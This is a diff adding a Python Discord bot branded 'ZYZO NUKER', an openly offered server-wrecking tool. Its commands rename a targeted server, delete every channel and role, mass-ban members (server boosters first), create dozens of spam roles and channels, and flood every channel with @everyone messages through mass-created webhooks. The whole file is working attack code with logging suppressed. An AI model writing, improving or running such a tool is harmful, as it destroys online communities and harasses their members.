@@ -1,1 +1,260 @@
+# THIS IS OPEN SOURCE SO U WILL HAVE TO EDIT IT YOURSELF.
 
+
+
+import discord
+from discord.ext import commands
+import asyncio
+import logging
+import os
+
+logging.basicConfig(level=logging.CRITICAL)
+discord.utils.setup_logging(level=logging.CRITICAL)
+
+logging.getLogger('discord').setLevel(logging.CRITICAL)
+logging.getLogger('discord.client').setLevel(logging.CRITICAL)
+logging.getLogger('discord.gateway').setLevel(logging.CRITICAL)
+
+bot_token = "token goes here" # only put bots id here if you put ur own itll break
+AUTHORIZED_USER_ID = "user id here" # put the person controlling the bot's ID here
+
+intents = discord.Intents.default()
+intents.messages = True
+intents.guilds = True
+intents.members = True
+intents.message_content = True
+
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+active_guild_id = None
+
+def print_banner():
+    print("< Made by Zyzo\n\n========================== ZYZO NUKER ============================\n\n           [ stop using lithium & rr nuker you skids..]\n\n\n!zyzo\n!ban\n!webhook_spam\n!delete_channel\n!delete_role\n!create_channel\n!create_role\n!set_guild\n\n\n\n========================== ZYZO NUKER ============================\n\n", end="")
+
+def clear_console():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+print_banner()
+
+@bot.command()
+async def set_guild(ctx, guild_id: int):
+    if ctx.author.id != AUTHORIZED_USER_ID:
+        return
+
+    global active_guild_id
+    guild = bot.get_guild(guild_id)
+    if guild:
+        active_guild_id = guild_id
+        await ctx.send(f"Successfully targeting {guild.name}")
+        print(f"Successfully targeting {guild.name}")
+    else:
+        await ctx.send(f"Guild ID {guild_id} not found.")
+        print(f"Guild ID {guild_id} not found.")
+    clear_console()
+    print_banner()
+
+async def get_active_guild():
+    if active_guild_id:
+        guild = bot.get_guild(active_guild_id)
+        if guild:
+            return guild
+    return None
+
+@bot.command()
+async def create_role(ctx):
+    if ctx.author.id != AUTHORIZED_USER_ID:
+        return
+
+    guild = await get_active_guild()
+    if guild:
+        for _ in range(50):
+            try:
+                role = await guild.create_role(name="zyzo runs u")
+                await ctx.send(f"Created role: {role.name}")
+                print(f"Created role: {role.name}")
+            except Exception as e:
+                await ctx.send(f"Failed to create role: {e}")
+                print(f"Failed to create role: {e}")
+                break
+        clear_console()
+        print_banner()
+
+@bot.command()
+async def create_channel(ctx):
+    if ctx.author.id != AUTHORIZED_USER_ID:
+        return
+
+    guild = await get_active_guild()
+    if guild:
+        for _ in range(50):
+            try:
+                channel = await guild.create_text_channel("zyzo runs u")
+                await ctx.send(f"Created channel: {channel.name}")
+                print(f"Created channel: {channel.name}")
+            except Exception as e:
+                await ctx.send(f"Failed to create channel: {e}")
+                print(f"Failed to create channel: {e}")
+                break
+        clear_console()
+        print_banner()
+
+@bot.command()
+async def webhook_spam(ctx, invite: str = None):
+    if ctx.author.id != AUTHORIZED_USER_ID:
+        return
+
+    guild = await get_active_guild()
+    if guild:
+        for channel in guild.text_channels:
+            if channel.permissions_for(guild.me).create_webhook:
+                webhooks = []
+                try:
+                    for _ in range(15):
+                        webhook = await channel.create_webhook(name="ZYZO RUNS U")
+                        webhooks.append(webhook)
+                        await ctx.send(f"Created webhook in channel: {channel.name}")
+                        print(f"Created webhook in channel: {channel.name}")
+                except Exception as e:
+                    await ctx.send(f"Failed to create webhook in {channel.name}: {e}")
+                    print(f"Failed to create webhook in {channel.name}: {e}")
+                    continue
+
+                spam_message = f"@everyone zyzo runs you {invite}" if invite else "@everyone zyzo runs you"
+                for webhook in webhooks:
+                    try:
+                        for _ in range(20):
+                            await webhook.send(spam_message)
+                            await ctx.send(f"Sent message via webhook in channel: {channel.name}")
+                            print(f"Sent message via webhook in channel: {channel.name}")
+                    except Exception as e:
+                        await ctx.send(f"Error sending message via webhook: {e}")
+                        print(f"Error sending message via webhook: {e}")
+                        continue
+            else:
+                await ctx.send(f"No permission to create webhook in channel: {channel.name}")
+                print(f"No permission to create webhook in channel: {channel.name}")
+        clear_console()
+        print_banner()
+
+@bot.command()
+async def zyzo(ctx):
+    if ctx.author.id != AUTHORIZED_USER_ID:
+        return
+
+    guild = await get_active_guild()
+    if guild:
+        await guild.edit(name="ZYZO RUNS U")
+        await ctx.send(f"Server name changed to 'ZYZO RUNS U'.")
+        print(f"Server name changed to 'ZYZO RUNS U'.")
+
+        channels = guild.channels.copy()
+        for i, channel in enumerate(channels):
+            try:
+                await channel.delete()
+                await ctx.send(f"Deleted channel: {channel.name}")
+                print(f"Deleted channel: {channel.name}")
+            except Exception as e:
+                await ctx.send(f"Failed to delete channel {channel.name}: {e}")
+                print(f"Failed to delete channel {channel.name}: {e}")
+                pass
+            if (i + 1) % 65 == 0:
+                await asyncio.sleep(0.5)
+
+        members = sorted(guild.members, key=lambda m: not any(badge.name == 'Server Booster' for badge in m.roles))
+        for i, member in enumerate(members):
+            if member != ctx.author:
+                try:
+                    await member.ban(reason="Banned by !zyzo command")
+                    await ctx.send(f"Banned {member.name}")
+                    print(f"Banned {member.name}")
+                except Exception as e:
+                    await ctx.send(f"Failed to ban member {member.name}: {e}")
+                    print(f"Failed to ban member {member.name}: {e}")
+                    pass
+            if (i + 1) % 150 == 0:
+                await asyncio.sleep(0.5)
+
+        clear_console()
+        print_banner()
+
+@bot.command()
+async def delete_channel(ctx):
+    if ctx.author.id != AUTHORIZED_USER_ID:
+        return
+
+    guild = await get_active_guild()
+    if guild:
+        channels = guild.channels.copy()
+        for i, channel in enumerate(channels):
+            try:
+                await channel.delete()
+                await ctx.send(f"Deleted channel: {channel.name}")
+                print(f"Deleted channel: {channel.name}")
+            except Exception as e:
+                await ctx.send(f"Failed to delete channel {channel.name}: {e}")
+                print(f"Failed to delete channel {channel.name}: {e}")
+                pass
+            if (i + 1) % 65 == 0:
+                await asyncio.sleep(0.5)
+        clear_console()
+        print_banner()
+
+@bot.command()
+async def delete_role(ctx):
+    if ctx.author.id != AUTHORIZED_USER_ID:
+        return
+
+    guild = await get_active_guild()
+    if guild:
+        roles = guild.roles.copy()
+        for i, role in enumerate(roles):
+            if role != guild.default_role and role != ctx.author.top_role:
+                try:
+                    await role.delete()
+                    await ctx.send(f"Deleted role: {role.name}")
+                    print(f"Deleted role: {role.name}")
+                except Exception as e:
+                    await ctx.send(f"Failed to delete role {role.name}: {e}")
+                    print(f"Failed to delete role {role.name}: {e}")
+                    pass
+            if (i + 1) % 65 == 0:
+                await asyncio.sleep(0.5)
+        clear_console()
+        print_banner()
+
+@bot.command()
+async def ban(ctx):
+    if ctx.author.id != AUTHORIZED_USER_ID:
+        return
+
+    guild = await get_active_guild()
+    if guild:
+        members = sorted(guild.members, key=lambda m: not any(badge.name == 'Server Booster' for badge in m.roles))
+        for i, member in enumerate(members):
+            if member != ctx.author:
+                try:
+                    await member.ban(reason="Banned by !ban command")
+                    await ctx.send(f"Banned {member.name}")
+                    print(f"Banned {member.name}")
+                except Exception as e:
+                    await ctx.send(f"Failed to ban member {member.name}: {e}")
+                    print(f"Failed to ban member {member.name}: {e}")
+                    pass
+            if (i + 1) % 150 == 0:
+                await asyncio.sleep(0.5)
+        clear_console()
+        print_banner()
+
+@bot.event
+async def on_ready():
+    print("Bot is ready.")
+
+@bot.event
+async def on_command_error(ctx, error):
+    await ctx.send(f"Error: {error}")
+    print(f"Error: {error}")
+
+async def main():
+    await bot.start(bot_token)
+
+asyncio.run(main())
